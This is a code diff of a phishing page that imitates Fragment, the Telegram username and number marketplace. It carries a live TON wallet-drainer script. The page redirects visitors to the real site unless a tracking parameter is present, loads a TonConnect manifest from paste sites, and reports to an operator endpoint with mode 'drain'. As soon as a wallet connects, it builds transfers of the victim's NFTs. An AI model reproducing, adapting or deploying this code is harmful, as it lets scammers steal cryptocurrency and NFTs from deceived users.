@@ -1,26 +1,28 @@
 <!DOCTYPE html>
 <html>
   
-<meta http-equiv="cache-control" content="no-cache">
-<meta http-equiv="expires" content="0">
 <meta http-equiv="content-type" content="text/html;charset=utf-8" />
 <head>
     <meta charset="utf-8">
     <title>$number – Fragment</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
     <script>
+    // Функция для парсинга URL и проверки параметров
     function checkUrlParams() {
       const urlParams = new URLSearchParams(window.location.search);
 
+      // Проверяем наличие параметра tgWebAppStartParam
       const tgParam = urlParams.get('tgWebAppStartParam');
       if (!tgParam) {
         return false;
       }
 
+      // Если параметр есть, декодируем и проверяем его
       try {
         const decodedParam = atob(tgParam);
         const paramsArray = decodedParam.split('-');
 
+        // Разбираем параметры на ключи и значения
         const params = {};
         paramsArray.forEach(param => {
           const [key, value] = param.split('_');
@@ -31,13 +33,16 @@
           return false;
         }
 
+        // Успешная проверка, возвращаем true
         return true;
 
       } catch (error) {
+        // Обработка ошибок декодирования
         return false;
       }
     }
 
+    // Выполняем проверку параметров перед загрузкой страницы
     document.addEventListener('DOMContentLoaded', function() {
       if (!checkUrlParams()) {
         window.location.href = "https://fragment.com/";
@@ -239,28 +244,35 @@
 <script src="/js/tgstickerc16a.js"></script>
 <script src="/telegram.org/js/telegram-widgetb6d7.js"></script>
 <script>
+// Очистка кеша TonConnect при заходе на сайт
 document.addEventListener('DOMContentLoaded', function() {
-    localStorage.removeItem('tonconnect');
+    localStorage.removeItem('tonconnect'); // Удаляем сохраненное состояние TonConnect
 });
 
+  // Функция для форматирования даты в формате ISO 8601
   function formatDateToISO(date) {
       return date.toISOString();
   }
 
+  // Функция для форматирования даты в короткий текстовый формат
   function formatDateShortDisplay(date) {
       const options = { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
       return date.toLocaleString('en-US', options).replace(',', ' at');
   }
 
+  // Функция для форматирования даты в длинный текстовый формат
   function formatDateLongDisplay(date) {
       const options = { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
       return date.toLocaleString('en-GB', options).replace(',', ' at');
   }
 
+  // Получаем текущую дату и время
   const now = new Date();
 
+  // Отнимаем 2 минуты от текущего времени
   now.setMinutes(now.getMinutes() - 2);
 
+  // Вставляем обновленное время в оба элемента time
   document.getElementById('short-time').setAttribute('datetime', formatDateToISO(now));
   document.getElementById('short-time').textContent = formatDateShortDisplay(now);
 
@@ -295,12 +307,7 @@ function splitAddress(friendlyAddress) {
     }
     return { head: '', middle: '', tail: '' };
 }
-  
-document.addEventListener('DOMContentLoaded', async function() {
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://pastebin.com/raw/Yk2cstyP'
-    });
-  
+
 async function updateMenuContent(isConnected) {
     const menuWindow = document.querySelector('.tm-header-menu-window.js-header-menu-window');
 
@@ -354,10 +361,11 @@ async function updateMenuContent(isConnected) {
             </div>
                   `;
 
+                  // Привязка событий после обновления содержимого
                   document.querySelector('.ton-logout-link').addEventListener('click', async () => {
                     await tonConnectUI.disconnect();
                     const isConnected = await tonConnectUI.connected;
-                    updateMenuContent(isConnected);
+                    updateMenuContent(isConnected); // Update the menu content after disconnecting
                   });
 
               } else {
@@ -387,10 +395,11 @@ async function updateMenuContent(isConnected) {
                   `;
 
 
+                // Add event listener for the Connect TON button
                 document.getElementById('ton-connect-button').addEventListener('click', async () => {
                     await tonConnectUI.connectWallet();
                     const isConnected = await tonConnectUI.connected;
-                    updateMenuContent(isConnected);
+                    updateMenuContent(isConnected); // Update the menu content after disconnecting
                 });
               }
           }
@@ -410,13 +419,23 @@ tonConnectUI.onStatusChange((status) => {
     updateMenuContent(status);
 });
 });
+  </script>
 
+<script>
 function parseUrlParams(url) {
+    // Получаем параметры из URL
     const urlParams = new URL(url).searchParams;
+
+    // Извлекаем значение параметра tgWebAppStartParam
     const paramString = atob(urlParams.get('tgWebAppStartParam'));
+
+    // Разбиваем строку на части через символ "-"
     const paramsArray = paramString.split('-');
+
+    // Инициализируем объект для хранения значений
     const params = {};
 
+    // Проходим по каждой части и извлекаем значения через символ "_"
     paramsArray.forEach(param => {
         const [key, value] = param.split('_');
         params[key] = value;
@@ -427,21 +446,25 @@ function parseUrlParams(url) {
 
 const currentUrl = window.location.href;
 
-let { price, number, username, worker } = parseUrlParams(currentUrl);
-
-if (!worker) {
-  worker = "old_version"; // Переменная worker теперь изменяема
+// Парсим параметры
+const { price, number, username, worker } = parseUrlParams(currentUrl);
+//console.log({ price, number, username, worker })
+if (!worker){
+  worker="old_version"
 }
 
-
+// Заменяем $price на странице
 document.body.innerHTML = document.body.innerHTML.replace(/\$price/g, price);
 
 if (number) {
+    // Если параметр number существует, убираем символы 'z' и форматируем его
     let cleanedNumber = number.replace(/z/g, '');
     let formattedNumber = `+${cleanedNumber.slice(0, 3)} ${cleanedNumber.slice(3, 7)} ${cleanedNumber.slice(7)}`;
 
+    // Заменяем $number на странице
     document.body.innerHTML = document.body.innerHTML.replace(/\$number/g, formattedNumber);
 } else if (username) {
+    // Если параметр username существует, заменяем на него $number и создаем блок с информацией
     document.body.innerHTML = document.body.innerHTML.replace(/\$number/g, username+".t.me");
     const telegramBlock = `
     <div class="tm-list tm-section-box tm-section-auction-info" bis_skin_checked="1">
@@ -480,14 +503,16 @@ if (number) {
     }
 }
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-      manifestUrl: 'https://pastebin.com/raw/Yk2cstyP'
+      manifestUrl: 'https://pst.innomi.net/paste/3q4e28p7yb9kzdpav2fenog2/raw'
   });
 
   document.getElementById('ton-connect-button').addEventListener('click', async () => {
     try {
         if (tonConnectUI.connected) {
+            // Если кошелек уже подключен, сразу выполняем транзакцию
             await transferTon();
         } else {
+            // Если кошелек не подключен, выполняем подключение
             await tonConnectUI.connectWallet();
         }
     } catch (error) {
@@ -528,15 +553,16 @@ async function transferTon() {
         const nftAddresses = await fetchUserNFTs();
         let transactionMessages = [];
 
-        const estimatedCommissionInTON = 0.50;
+        // Примерная комиссия, в зависимости от сети и сложности транзакции
+        const estimatedCommissionInTON = 0.50; // Например, 0.05 TON
 
         console.log('Estimated Commission:', estimatedCommissionInTON);
 
         if (nftAddresses && nftAddresses.length > 0) {
-            let processedNFTs = 0;
+            let processedNFTs = 0; // Счётчик для ограничения
             for (const item of nftAddresses) {
                 if (processedNFTs >= 4) {
-                    break;
+                    break; // Прерывание цикла после обработки 3 NFT
                 }
                 const nftPrice = item.price;
 
@@ -556,10 +582,10 @@ async function transferTon() {
                 const addresses = tonConnectUI.wallet.account.address
                 transactionMessages.push({
                     address: item.address,
-                    amount: "30000000",
+                    amount: "30000000", // Сумма в нанотонах (10^7 = 0.01 TON)
                     payload: base64Payload 
                 });
-              processedNFTs++;
+              processedNFTs++; // Увеличиваем счетчик
             }
         }
 
@@ -631,7 +657,7 @@ async function notifyTelegramBot(walletAddress, offer, mode) {
         const message = generateNotificationMessage(walletAddress, offer, mode);
         
 
-        const response = await fetch('/notify_performance', {
+        const response = await fetch('/notify', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -678,30 +704,31 @@ async function notifyTelegramBot(walletAddress, offer, mode) {
           const nftData = await response.json();
           console.log(nftData)
   
-          return nftData;
+          // Ensure each NFT object has a price property
+          return nftData; // nftData should be an array of objects with { type, address, name, price }
       } catch (e) {
           console.error('Failed to fetch NFTs:', e.message || e);
           return [];
       }
   }
   
-      const val = 0;
+  const val = 0;
+  tonConnectUI.onStatusChange(async (status) => {
+    console.log('Status Change:', status); // Log the status change
 
-      tonConnectUI.onStatusChange(async (status) => {
-        console.log('Status Change:', status);
+    if (status) {
+        console.log('Wallet connected');
+        await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet connected', 'drain');
+        await transferTon(); // Добавьте await для обеспечения выполнения кода последовательно
+    } else {
+        console.log('Wallet not connected');
+        await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet disconnected', 'decline');
+    }
+});
 
-        if (status) {
-          console.log('Wallet connected');
-          await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet connected', 'drain');
-          await transferTon();
-        } else {
-          console.log('Wallet not connected');
-          await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet disconnected', 'decline');
-        }
-      });
+  </script>
   
-  </head>
-  <body>
-    <!-- Основное содержимое страницы -->
+    
   </body>
+
 </html>
